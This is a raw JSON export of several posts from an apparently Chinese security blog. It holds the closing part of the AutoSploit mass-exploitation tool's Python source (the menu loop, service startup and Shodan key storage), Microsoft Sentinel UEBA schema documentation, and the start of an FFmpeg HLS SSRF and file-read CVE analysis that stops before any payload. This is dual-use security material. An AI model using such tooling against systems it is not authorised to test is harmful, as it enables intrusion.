raw_input(&quot;\\n&lt;&quot; + t.cyan(&quot;AUTOSPLOIT&quot;) + &quot;&gt;$ &quot;)            if action == &#x27;1&#x27;:                usage()            elif action == &#x27;2&#x27;:                if not os.path.isfile(&quot;hosts.txt&quot;):                    targets(True)                else:                    append = raw_input(&quot;\\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Append hosts to file or overwrite? [A/O]: &quot;).lower()                    if append == &#x27;a&#x27;:                        targets(False)                    elif append == &#x27;o&#x27;:                        targets(True)                    else:                        print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option.&quot;            elif action == &#x27;3&#x27;:                if not os.path.isfile(&quot;hosts.txt&quot;):                    print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;                else:                    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Printing hosts...\\n\\n&quot;                    time.sleep(2)                    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as infile:                        for line in infile:                            print &quot;[&quot; + t.cyan(&quot;-&quot;) + &quot;]&quot; + line                    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Done.\\n&quot;            elif action == &#x27;4&#x27;:                if not os.path.isfile(&quot;hosts.txt&quot;):                    print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;                    print &quot;Please make sure to gather a list of targets&quot;                    print &quot;by selecting the &#x27;Gather Hosts&#x27; option&quot;                    print &quot;before executing the &#x27;Exploit&#x27; module.&quot;                if configured == True:                    exploit(query)                elif configured == False:                    settings()            elif action == &#x27;5&#x27;:                print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Exiting AutoSploit...&quot;                break            else:                print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option.&quot;    except KeyboardInterrupt:        print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. User aborted.&quot;        sys.exit(0)if __name__ == &quot;__main__&quot;:    logo()    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Initializing AutoSploit...&quot;    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]One moment please while we check the Postgresql and Apache services...\\n&quot;    postgresql = cmdline(&quot;sudo service postgresql status | grep active&quot;)    if &quot;Active: inactive&quot; in postgresql:        print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. Heuristics indicate Postgresql Service is offline&quot;        start_pst = raw_input(&quot;\\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Start Postgresql Service? [Y]es/[N]o: &quot;).lower()        if start_pst == &#x27;y&#x27;:            os.system(&quot;sudo service postgresql start&quot;)            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Postgresql Service Started...&quot;            time.sleep(1.5)        elif start_pst == &#x27;n&#x27;:            print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]AutoSploit&#x27;s MSF related operations require this service to be active.&quot;            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Aborted.&quot;            time.sleep(1.5)            sys.exit(0)        else:            print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to starting the service.&quot;            os.system(&quot;sudo service postgresql start&quot;)            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Postgresql Service Started...&quot;            time.sleep(1.5)    apache = cmdline(&quot;service apache2 status | grep active&quot;)    if &quot;Active: inactive&quot; in apache:        print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. Heuristics indicate Apache Service is offline&quot;        start_ap = raw_input(&quot;\\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Start Apache Service? [Y]es/[N]o: &quot;).lower()        if start_ap == &#x27;y&#x27;:            os.system(&quot;sudo service apache2 start&quot;)            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Apache2 Service Started...&quot;            time.sleep(1.5)        elif start_ap == &#x27;n&#x27;:            print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]AutoSploit&#x27;s MSF related operations require this service to be active.&quot;            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Aborted.&quot;            time.sleep(1.5)            sys.exit(0)        else:            print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to starting the service.&quot;            os.system(&quot;sudo service apache2 start&quot;)            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Apache2 Service Started...&quot;            time.sleep(1.5)    # We will check if the shodan api key has been saved before, if not we are going to prompt    # for it and save it to a file    if not os.path.isfile(&quot;api.p&quot;):        print &quot;\\n[&quot; + t.green(&quot;+&quot;) + &quot;]Please provide your Shodan.io API key.&quot;        SHODAN_API_KEY = raw_input(&quot;API key: &quot;)        pickle.dump(SHODAN_API_KEY, open(&quot;api.p&quot;, &quot;wb&quot;))        path = os.path.abspath(&quot;api.p&quot;)        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]\\nYour API key has been saved to &quot; + path        main()    else:        try:            SHODAN_API_KEY = pickle.load(open(&quot;api.p&quot;, &quot;rb&quot;))        except IOError as e:            print &quot;\\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. An IO error was raised while attempting to read API data.&quot;            print e        path = os.path.abspath(&quot;api.p&quot;)        print &quot;\\n[&quot; + t.green(&quot;+&quot;) + &quot;]Your API key was loaded from &quot; + path        main()\n\n\n","categories":["安全工具"],"tags":["安全开发"]},{"title":"Azure Sentinel webinar：Enabling User and Entity Behavior Analytics (UEBA)","url":"/Azure%20Sentinel%20webinar:%20Enabling%20User%20and%20Entity%20Behavior%20Analytics%20(UEBA)/","content":"什么是用户和实体行为分析 (UEBA)？识别组织内的威胁及其潜在影响（无论是被入侵的实体还是恶意内部因素）始终是一个耗时耗力的过程。 筛选警报、连接各点和主动搜寻都需要大量的时间和精力，却只有极少回报，而复杂的潜在威胁却很难发现。 特别难以发现的威胁（如零日威胁、针对性威胁和高级持久性威胁）对组织来说是最危险的，因此能够检测这些威胁则变得更加重要。\n\n\n￼\n安全驱动的分析受 Gartner 的 UEBA 解决方案范例的启发，Microsoft Sentinel 根据 3 个参考框架提供了一种“由外而内”的方法：\n\n    用例：MITRE ATT&amp;CK 策略、技术和分解技术框架将各种实体作为受害者、作恶者或枢轴点放入杀伤链中，Microsoft Sentinel 根据按照此框架开展的安全性研究对相关攻击途径和方案划分优先级，从而特别专注于每个数据源可以提供的最有价值的日志。\n\n\n    数据源：尽管首要支持 Azure 数据源，但出于周全性考虑，Microsoft Sentinel 选择第三方数据源来提供与我们的威胁方案相匹配的数据。\n\n\n    分析：Microsoft Sentinel 使用各种机器学习 (ML) 算法来识别异常活动，并以上下文信息丰富的形式清晰、准确地呈现证据，相关示例如下所示。\n\n\n\n￼\n\nMicrosoft Sentinel 提供的项目可帮助安全分析师结合上下文并通过对比用户的基线概况来清楚地了解环境中的异常活动。 用户（或主机、地址）执行的操作在上下文中进行评估，“true”结果则表示发现异常：\n\n    跨地理位置、设备和环境。\n\n\n    跨时间和频率（与用户自己的历史记录相比）。\n\n\n    与对等方的行为进行比较。\n\n\n    与组织的行为进行比较。\n\n\n\n￼￼\n计分每个活动都使用“调查优先级评分”进行评分，该评分根据对用户及其对等方的行为学习来确定特定用户执行特定活动的概率。 被识别为最不正常的活动会获得最高分（分数范围为 0-10 分）。\n时间线\n规则模版https://docs.microsoft.com/zh-cn/azure/sentinel/watchlist-schemas\n高价值资产“高价值资产”监视列表列出组织中具有重要价值的设备、资源和其他资产，此监视列表包括以下字段：\n\n\n\n字段名称\n格式\n示例\n必需/可选\n\n\n\n资产类型\n字符串\nDevice, Azure resource, AWS resource, URL, SPO, File share, Other\n必需\n\n\n资产 ID\n字符串，视资产类型而定\n/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourceGroups/SOC-Purview/providers/Microsoft.Storage/storageAccounts/purviewadls\n必需\n\n\n资产名称\n字符串\nMicrosoft.Storage/storageAccounts/purviewadls\n可选\n\n\n资产 FQDN\nFQDN\nFinance-SRv.local.microsoft.com\n必需\n\n\nIP 地址\nIP\n1.1.1.1\n可选\n\n\n标记\n列出\n[“SAW user”,”Blue Ocean team”]\n可选\n\n\nVIP 用户“VIP 用户”监视列表列出组织中影响力较高的员工的用户帐户，此监视列表包括以下值：\n\n\n\n字段名称\n格式\n示例\n必需/可选\n\n\n\n用户标识符\nUID\n52322ec8-6ebf-11eb-9439-0242ac130002\n可选\n\n\n用户 AAD 对象 ID\nSID\n03fa4b4e-dc26-426f-87b7-98e0c9e2955e\n可选\n\n\n用户本地 SID\nSID\nS-1-12-1-4141952679-1282074057-627758481-2916039507\n可选\n\n\n用户主体名称\nUPN\n&#x4a;&#101;&#x66;&#x66;&#76;&#x40;&#x73;&#x65;&#x63;&#99;&#x78;&#x70;&#46;&#x6e;&#x69;&#110;&#x6a;&#x61;\n必需\n\n\n标记\n列出\n[“SAW user”,”Blue Ocean team”]\n可选\n\n\n网络映射“网络映射”监视列表列出 IP 子网及其各自的组织上下文，此监视列表包括以下字段：\n\n\n\n字段名称\n格式\n示例\n必需/可选\n\n\n\nIP 子网\n子网范围\n198.51.100.0/24 - 198……/22\n必需\n\n\n范围名\n字符串\nDMZ\n可选\n\n\n标记\n列出\n[“Example”,”Example”]\n可选\n\n\n离职的员工“离职的员工”监视列表列出已离职或即将离职的员工的用户帐户，此监视列表包括以下字段：\n\n\n\n字段名称\n格式\n示例\n必需/可选\n\n\n\n用户标识符\nUID\n52322ec8-6ebf-11eb-9439-0242ac130002\n可选\n\n\n用户 AAD 对象 ID\nSID\n03fa4b4e-dc26-426f-87b7-98e0c9e2955e\n可选\n\n\n用户本地 SID\nSID\nS-1-12-1-4141952679-1282074057-123\n可选\n\n\n用户主体名称\nUPN\n&#74;&#x65;&#x66;&#x66;&#76;&#64;&#115;&#101;&#x63;&#x63;&#120;&#x70;&#x2e;&#x6e;&#x69;&#110;&#106;&#97;\n必需\n\n\nUserState\n字符串\n\n\n\n\n建议使用 Notified 或 Terminated\nTerminated\n必需\n\n\n\n通知日期\n时间戳 - 具体日期\n01.12.20\n可选\n\n\n终止日期\n时间戳 - 具体日期\n01.01.21\n必需\n\n\n标记\n列出\n[“SAW user”,”Amba Wolfs team”]\n可选\n\n\n标识相关“标识相关”监视列表列出属于同一人员的相关用户帐户，此监视列表包括以下字段：\n\n\n\n字段名称\n格式\n示例\n必需/可选\n\n\n\n用户标识符\nUID\n52322ec8-6ebf-11eb-9439-0242ac130002\n可选\n\n\n用户 AAD 对象 ID\nSID\n03fa4b4e-dc26-426f-87b7-98e0c9e2955e\n可选\n\n\n用户本地 SID\nSID\nS-1-12-1-4141952679-1282074057-627758481-2916039507\n可选\n\n\n用户主体名称\nUPN\n&#74;&#101;&#102;&#102;&#76;&#64;&#x73;&#x65;&#x63;&#99;&#x78;&#x70;&#x2e;&#x6e;&#105;&#110;&#106;&#97;\n必需\n\n\n员工 ID\n字符串\n8234123\n可选\n\n\nEmail\n电子邮件\n&#74;&#101;&#102;&#x66;&#x4c;&#64;&#x73;&#101;&#x63;&#x63;&#x78;&#112;&#x2e;&#110;&#x69;&#110;&#x6a;&#x61;\n可选\n\n\n关联的特权帐户 ID\nUID/SID\nS-1-12-1-4141952679-1282074057-627758481-2916039507\n可选\n\n\n关联的特权帐户\nUPN\n&#x41;&#x64;&#109;&#x69;&#110;&#64;&#115;&#101;&#x63;&#99;&#120;&#112;&#x2e;&#110;&#105;&#110;&#x6a;&#x61;\n可选\n\n\n标记\n列出\n[“SAW user”,”Amba Wolfs team”]\n可选\n\n\n服务帐户“服务帐户”监视列表列出服务帐户及其所有者，此监视列表包括以下字段：\n\n\n\n字段名称\n格式\n示例\n必需/可选\n\n\n\n服务标识符\nUID\n1111-112123-12312312-123123123\n可选\n\n\n服务 AAD 对象 ID\nSID\n11123-123123-123123-123123\n可选\n\n\n服务本地 SID\nSID\nS-1-12-1-3123123-123213123-12312312-2916039507\n可选\n\n\n服务主体名称\nUPN\n&#109;&#x79;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#x70;&#x72;&#105;&#110;&#64;&#x63;&#x6f;&#x6e;&#x74;&#x6f;&#x73;&#111;&#46;&#99;&#x6f;&#109;\n必需\n\n\n所有者用户标识符\nUID\n52322ec8-6ebf-11eb-9439-0242ac130002\n可选\n\n\n所有者用户 AAD 对象 ID\nSID\n03fa4b4e-dc26-426f-87b7-98e0c9e2955e\n可选\n\n\n所有者用户本地 SID\nSID\nS-1-12-1-4141952679-1282074057-627758481-2916039507\n可选\n\n\n所有者用户主体名称\nUPN\n&#74;&#x65;&#102;&#x66;&#x4c;&#x40;&#x73;&#101;&#99;&#x63;&#120;&#112;&#x2e;&#110;&#105;&#110;&#x6a;&#x61;\n必需\n\n\n标记\n列出\n[“Automation Account”,”GitHub Account”]\n可选\n\n\nhttps://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments\nBehaviorAnalytics 表下表说明了 Microsoft Sentinel 中每个实体详细信息页上显示的行为分析数据。\n\n\n\n字段\n类型\n说明\n\n\n\nTenantId\nstring\n租户的唯一 ID 编号。\n\n\nSourceRecordId\n字符串\nEBA 事件的唯一 ID 编号。\n\n\nTimeGenerated\ndatetime\n活动发生时的时间戳。\n\n\nTimeProcessed\ndatetime\nEBA 引擎处理活动时的时间戳。\n\n\nActivityType\n字符串\n活动的高级类别。\n\n\nActionType\n字符串\n活动的规范化名称。\n\n\nUserName\n字符串\n发起活动的用户的用户名。\n\n\nUserPrincipalName\n字符串\n发起活动的用户的完整用户名。\n\n\nEventSource\n字符串\n提供原始事件的数据源。\n\n\nSourceIPAddress\n字符串\n发起活动的 IP 地址。\n\n\nSourceIPLocation\n字符串\n发起活动的国家/地区，从 IP 地址进行扩充。\n\n\nSourceDevice\n字符串\n发起活动的设备的主机名。\n\n\nDestinationIPAddress\n字符串\n活动目标的 IP 地址。\n\n\nDestinationIPLocation\n字符串\n活动目标所在国家/地区，从 IP 地址进行扩充。\n\n\nDestinationDevice\n字符串\n目标设备的名称。\n\n\nUsersInsights\n动态\n相关用户的上下文扩充（详细信息如下）。\n\n\nDevicesInsights\n动态\n相关设备的上下文扩充（详细信息如下）。\n\n\nActivityInsights\n动态\n基于我们的分析的活动的上下文分析（详细信息如下）。\n\n\nInvestigationPriority\nint\n异常分数，介于 0-10（0=良性，10=高度异常）。\n\n\n实体扩充动态字段\nUsersInsights 字段下表说明了 BehaviorAnalytics 表中 UsersInsights 动态字段中提供的扩充：\n\n\n\n扩充名称\n说明\n示例值\n\n\n\n帐户显示名称\n\n\n\n\n(AccountDisplayName)\n用户的帐户显示名称。\nAdmin、Hayden Cook\n\n\n帐户域\n\n\n\n\n(AccountDomain)\n用户的帐户域名。\n帐户对象 ID\n\n\n(AccountObjectID)\n用户的帐户对象 ID。\na58df659-5cab-446c-9dd0-5a3af20ce1c2\n\n\n冲击半径\n\n\n\n\n(BlastRadius)\n冲击半径根据多个因素来计算：用户在组织树中的位置，以及用户的 Azure Active Directory 角色和权限。\n低、中、高\n\n\n休眠帐户\n\n\n\n\n(IsDormantAccount)\n此帐户在过去 180 天内未使用。\nTrue、False\n\n\n本地管理员\n\n\n\n\n(IsLocalAdmin)\n此帐户具有本地管理员权限。\nTrue、False\n\n\n新帐户\n\n\n\n\n(IsNewAccount)\n此帐户是在过去 30 天内创建的。\nTrue、False\n\n\n本地 SID\n\n\n\n\n(OnPremisesSID)\n与该操作相关的用户的本地 SID。\nS-1-5-21-1112946627-1321165628-2437342228-1103\n\n\n\n\n\n\n\nDevicesInsights 字段下表说明了 BehaviorAnalytics 表中 DevicesInsights 动态字段中提供的扩充：\n\n\n\n扩充名称\n说明\n示例值\n\n\n\n浏览器\n\n\n\n\n(Browser)\n操作中使用的浏览器。\nEdge、Chrome\n\n\n设备系列\n\n\n\n\n(DeviceFamily)\n操作中使用的设备系列。\nWindows\n\n\n设备类型\n\n\n\n\n(DeviceType)\n操作中使用的客户端设备类型\n桌面\n\n\nISP\n\n\n\n\n(ISP)\n操作中使用的 Internet 服务提供商。\n\n\n\n操作系统\n\n\n\n\n(OperatingSystem)\n操作中使用的操作系统。\nWindows 10\n\n\n威胁 intel 指标说明\n\n\n\n\n(ThreatIntelIndicatorDescription)\n从操作中使用的 IP 地址解析的观察到的威胁指标的说明。\n主机是僵尸网络的成员：azorult\n\n\n威胁 intel 指标类型\n\n\n\n\n(ThreatIntelIndicatorType)\n从操作中使用的 IP 地址解析的威胁指标的类型。\n僵尸网络、C2、CryptoMining、Darknet、Ddos、MaliciousUrl、恶意软件、仿冒、代理、PUA、播放列表\n\n\n用户代理\n\n\n\n\n(UserAgent)\n操作中使用的用户代理。\nMicrosoft Azure Graph Client Library 1.0、\n\n\nSwagger-Codegen/1.4.0.0/csharp,\n\n\n\n\nEvoSTS\n\n\n\n\n用户代理系列\n\n\n\n\n(UserAgentFamily)\n操作中使用的用户代理系列。\nChrome、Edge、Firefox\n\n\n\n\n\n\n\nActivityInsights 字段下表说明了 BehaviorAnalytics 表中 ActivityInsights 动态字段中提供的扩充：\n已执行的操作\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户首次执行的操作\n\n\n\n\n\n(FirstTimeUserPerformedAction)\n180\n用户首次执行此操作。\nTrue、False\n\n\n用户不常执行的操作\n\n\n\n\n\n(ActionUncommonlyPerformedByUser)\n10\n用户不常执行此操作。\nTrue、False\n\n\n对等机之间不常执行的操作\n\n\n\n\n\n(ActionUncommonlyPerformedAmongPeers)\n180\n用户的对等机之间不常执行此操作。\nTrue、False\n\n\n首次在租户中执行的操作\n\n\n\n\n\n(FirstTimeActionPerformedInTenant)\n180\n此操作由组织中的任何人首次执行。\nTrue、False\n\n\n租户中不常执行的操作\n\n\n\n\n\n(ActionUncommonlyPerformedInTenant)\n180\n组织中不常执行此操作。\nTrue、False\n\n\n\n\n\n\n\n\n使用的应用\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户首次使用的应用\n\n\n\n\n\n(FirstTimeUserUsedApp)\n180\n用户首次使用此应用。\nTrue、False\n\n\n用户不常使用的应用\n\n\n\n\n\n(AppUncommonlyUsedByUser)\n10\n用户不常使用此应用。\nTrue、False\n\n\n在对等机之间不常使用的应用\n\n\n\n\n\n(AppUncommonlyUsedAmongPeers)\n180\n在用户的对等机之间不常使用此应用。\nTrue、False\n\n\n首次在租户中观察到的应用\n\n\n\n\n\n(FirstTimeAppObservedInTenant)\n180\n在组织中首次观察到此应用。\nTrue、False\n\n\n租户中不常使用的应用\n\n\n\n\n\n(AppUncommonlyUsedInTenant)\n180\n组织中不常使用此应用。\nTrue、False\n\n\n\n\n\n\n\n\n使用的浏览器\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户首次通过浏览器连接\n\n\n\n\n\n(FirstTimeUserConnectedViaBrowser)\n30\n用户首次观察到此浏览器。\nTrue、False\n\n\n用户不常使用的浏览器\n\n\n\n\n\n(BrowserUncommonlyUsedByUser)\n10\n用户不常使用此浏览器。\nTrue、False\n\n\n在对等机之间不常使用的浏览器\n\n\n\n\n\n(BrowserUncommonlyUsedAmongPeers)\n30\n在用户的对等机之间不常使用此浏览器。\nTrue、False\n\n\n首次在租户中观察到的浏览器\n\n\n\n\n\n(FirstTimeBrowserObservedInTenant)\n30\n在组织中首次观察到此浏览器。\nTrue、False\n\n\n租户中不常使用的浏览器\n\n\n\n\n\n(BrowserUncommonlyUsedInTenant)\n30\n组织中不常使用此浏览器。\nTrue、False\n\n\n\n\n\n\n\n\n从其连接的国家/地区\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户首次从国家/地区连接\n\n\n\n\n\n(FirstTimeUserConnectedFromCountry)\n90\n用户首次从 IP 地址解析的这个地理位置连接。\nTrue、False\n\n\n用户不常从其连接的国家/地区\n\n\n\n\n\n(CountryUncommonlyConnectedFromByUser)\n10\n用户不常从 IP 地址解析的这个地理位置连接。\nTrue、False\n\n\n在对等机之间不常从其连接的国家/地区\n\n\n\n\n\n(CountryUncommonlyConnectedFromAmongPeers)\n90\n用户的对等机之间不常从 IP 地址解析的这个地理位置连接。\nTrue、False\n\n\n首次从租户中观察到的国家/地区连接\n\n\n\n\n\n(FirstTimeConnectionFromCountryObservedInTenant)\n90\n组织中的任何人首次从该国家/地区连接。\nTrue、False\n\n\n租户中不常从其连接的国家/地区\n\n\n\n\n\n(CountryUncommonlyConnectedFromInTenant)\n90\n组织中不常从 IP 地址解析的这个地理位置连接。\nTrue、False\n\n\n\n\n\n\n\n\n用于连接的设备\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户首次从设备连接\n\n\n\n\n\n(FirstTimeUserConnectedFromDevice)\n30\n用户首次从该源设备连接。\nTrue、False\n\n\n用户不常使用的设备\n\n\n\n\n\n(DeviceUncommonlyUsedByUser)\n10\n用户不常使用此设备。\nTrue、False\n\n\n在对等机之间不常使用的设备\n\n\n\n\n\n(DeviceUncommonlyUsedAmongPeers)\n180\n在用户的对等机之间不常使用此设备。\nTrue、False\n\n\n首次在租户中观察到的设备\n\n\n\n\n\n(FirstTimeDeviceObservedInTenant)\n30\n此设备首次在组织中观察到。\nTrue、False\n\n\n租户中不常使用的设备\n\n\n\n\n\n(DeviceUncommonlyUsedInTenant)\n180\n组织中不常使用此设备。\nTrue、False\n\n\n\n\n\n\n\n\n其他相关设备\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户首次登录到设备\n\n\n\n\n\n(FirstTimeUserLoggedOnToDevice)\n180\n用户首次连接到此目标设备。\nTrue、False\n\n\n租户中不常使用的设备系列\n\n\n\n\n\n(DeviceFamilyUncommonlyUsedInTenant)\n30\n组织中不常使用此设备系列。\nTrue、False\n\n\n\n\n\n\n\n\n用于连接的 Internet 服务提供商\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户首次通过 ISP 连接\n\n\n\n\n\n(FirstTimeUserConnectedViaISP)\n30\n用户首次观察到此 ISP。\nTrue、False\n\n\n用户不常使用的 ISP\n\n\n\n\n\n(ISPUncommonlyUsedByUser)\n10\n用户不常使用此 ISP。\nTrue、False\n\n\n在对等机之间不常使用的 ISP\n\n\n\n\n\n(ISPUncommonlyUsedAmongPeers)\n30\n在用户的对等机之间不常使用此 ISP。\nTrue、False\n\n\n首次在租户中通过 ISP 连接\n\n\n\n\n\n(FirstTimeConnectionViaISPInTenant)\n30\n在组织中首次观察到此 ISP。\nTrue、False\n\n\n租户中不常使用的 ISP\n\n\n\n\n\n(ISPUncommonlyUsedInTenant)\n30\n组织中不常使用此 ISP。\nTrue、False\n\n\n\n\n\n\n\n\n访问的资源\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户首次访问的资源\n\n\n\n\n\n(FirstTimeUserAccessedResource)\n180\n此资源由用户首次访问。\nTrue、False\n\n\n用户不常访问的资源\n\n\n\n\n\n(ResourceUncommonlyAccessedByUser)\n10\n用户不常访问该资源。\nTrue、False\n\n\n在对等机之间不常访问的资源\n\n\n\n\n\n(ResourceUncommonlyAccessedAmongPeers)\n180\n在用户的对等机之间不常访问该资源。\nTrue、False\n\n\n首次在租户中访问的资源\n\n\n\n\n\n(FirstTimeResourceAccessedInTenant)\n180\n此资源由组织中的任何人首次访问。\nTrue、False\n\n\n租户中不常访问的资源\n\n\n\n\n\n(ResourceUncommonlyAccessedInTenant)\n180\n组织中不常访问此资源。\nTrue、False\n\n\n\n\n\n\n\n\n杂项\n\n\n\n扩充名称\n基线（天）\n说明\n示例值\n\n\n\n用户上次执行的操作\n\n\n\n\n\n(LastTimeUserPerformedAction)\n180\n上次用户执行了相同的操作。\n\n\n\n过去未执行类似操作\n\n\n\n\n\n(SimilarActionWasn’tPerformedInThePast)\n30\n用户未在相同的资源提供程序中执行任何操作。\nTrue、False\n\n\n源 IP 位置\n\n\n\n\n\n(SourceIPLocation)\n空值\n此国家/地区从操作的源 IP 解析。\n[英国萨里]\n\n\n不常见的大量操作\n\n\n\n\n\n(UncommonHighVolumeOfOperations)\n7\n用户在同一个提供程序中执行了一连串类似操作\nTrue、False\n\n\nAzure AD 条件访问失败的异常数量\n\n\n\n\n\n(UnusualNumberOfAADConditionalAccessFailures)\n5\n由于条件访问导致无法进行身份验证的用户的异常数量\nTrue、False\n\n\n添加的异常数量的设备\n\n\n\n\n\n(UnusualNumberOfDevicesAdded)\n5\n用户添加了异常数量的设备。\nTrue、False\n\n\n删除的异常数量的设备\n\n\n\n\n\n(UnusualNumberOfDevicesDeleted)\n5\n用户删除了异常数量的设备。\nTrue、False\n\n\n添加到组中的异常数量的用户\n\n\n\n\n\n(UnusualNumberOfUsersAddedToGroup)\n5\n用户向组中添加了异常数量的用户。\nTrue、False\n\n\n\n\n\n\n\n\nIdentityInfo 表（公开预览版）为 Microsoft Sentinel 工作区启用 UEBA 后，来自 Azure Active Directory 的数据将同步到 Log Analytics 中的 IdentityInfo 表以在 Microsoft Sentinel 中使用。 可以在分析规则中嵌入从 Azure AD 同步的用户数据，以增强分析来适应你的用例并减少误报。虽然初始同步可能需要几天时间，但在数据完全同步后，将获得以下优势：\n\n    对 Azure AD 中的用户配置文件所做的更改会在 15 分钟内更新到 IdentityInfo 表中。\n\n\n    组和角色信息每天在 IdentityInfo 表和 Azure AD 之间同步。\n\n\n    每 21 天，Microsoft Sentinel 会与整个 Azure AD 重新同步，以确保过时的记录将完全更新。\n\n\n    IdentityInfo 表中的默认保留时间为 30 天。\n\n\n\n备注目前，仅支持内置角色。目前不支持有关已删除组（从组中删除了用户）的数据。下表描述了 Log Analytics 的 IdentityInfo 表中包含的用户身份数据。\n\n\n\n字段\n类型\n说明\n\n\n\nAccountCloudSID\nstring\n帐户的 Azure AD 安全标识符。\n\n\nAccountCreationTime\ndatetime\n创建用户帐户的日期 (UTC)。\n\n\nAccountDisplayName\nstring\n用户帐户的显示名称。\n\n\nAccountDomain\nstring\n用户帐户的域名。\n\n\nAccountName\nstring\n用户帐户的用户名。\n\n\nAccountObjectId\nstring\n用户帐户的 Azure Active Directory 对象 ID。\n\n\nAccountSID\nstring\n用户帐户的本地安全标识符。\n\n\nAccountTenantId\nstring\n用户帐户的 Azure Active Directory 租户 ID。\n\n\nAccountUPN\nstring\n用户帐户的用户主体名称。\n\n\nAdditionalMailAddresses\n动态\n用户的其他电子邮件地址。\n\n\nAssignedRoles\n动态\n为用户帐户分配的 Azure AD 角色。\n\n\n城市\nstring\n用户帐户的城市。\n\n\n国家/地区\nstring\n用户帐户的国家/地区。\n\n\nDeletedDateTime\ndatetime\n删除用户的日期和时间。\n\n\n部门\nstring\n用户帐户的部门。\n\n\nGivenName\nstring\n用户帐户的给定名称。\n\n\nGroupMembership\n动态\n用户帐户所归属的 Azure AD 组。\n\n\nIsAccountEnabled\nbool\n指示是否在 Azure AD 中启用了用户帐户。\n\n\nJobTitle\nstring\n用户帐户的职务。\n\n\nMailAddress\nstring\n用户帐户的主要电子邮件地址。\n\n\n管理员\nstring\n用户帐户的管理员别名。\n\n\nOnPremisesDistinguishedName\nstring\nAzure AD 可分辨名称 (DN)。专有名称是一系列相对专有名称 (RDN)，由逗号连接。\n\n\n电话\nstring\n用户帐户的电话号码。\n\n\nSourceSystem\nstring\n用户数据的来源系统。\n\n\nState\nstring\n用户帐户的地理状态。\n\n\nStreetAddress\nstring\n用户帐户的办公街道地址。\n\n\nSurname\nstring\n用户的姓氏。帐户。\n\n\nTenantId\nstring\n用户的租户 ID。\n\n\nTimeGenerated\ndatetime\n生成事件的时间 (UTC)。\n\n\n类型\nstring\n表的名称。\n\n\nUserState\nstring\nAzure AD 中用户帐户的当前状态（活动/禁用/休眠/锁定）。\n\n\nUserStateChangedOn\ndatetime\n上次更改帐户状态的日期 (UTC)。\n\n\nUserType\nstring\n用户类型。\n\n\n","categories":["安全数据分析"],"tags":["UEBA"]},{"title":"CVE-2016-1897/8 - FFMpeg漏洞分析","url":"/CVE-2016-1897-8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。功能非常强大，是每个视频网站必不可少的多媒体文件处理程序。\n0x01 漏洞概述在FFMpeg2.X 由于在解析HTTP Live Streaming流媒体m3u8文件处理不当，可导致SSRF漏洞与任意文件读取漏洞。当网站允许用户上传多媒体文件，并使用FFMpeg进行处理时会触发该漏洞。\n这个漏洞有两个CVE编号，分别是CVE-2016-1897和CVE-2016-1898，它们两个的区别在于读取文件的行数，CVE-2016-1897只能读取文件的第一行，而CVE-2016-1898可以读取文件任意行，原理基本一样，这里就一起分析了。\n0x02 HLS（HTTP Live Streaming）由于漏洞是出现在解析HLS流媒体文件出的问题，所以我们必须先了解HLS。\nHLS（HTTP Live Streaming）是Apple公司开发的一种基于HTTP协议的流媒体通信协议，大多数都应用在PC上和Iphone上。它的基本原理是把一个视频流分成很多个很小很小很小的ts流文件，然后通过HTTP下载，每次下载一点点。在一个开始一个新的流媒体会话时，客户端都会先下载一个m3u8（播放列表 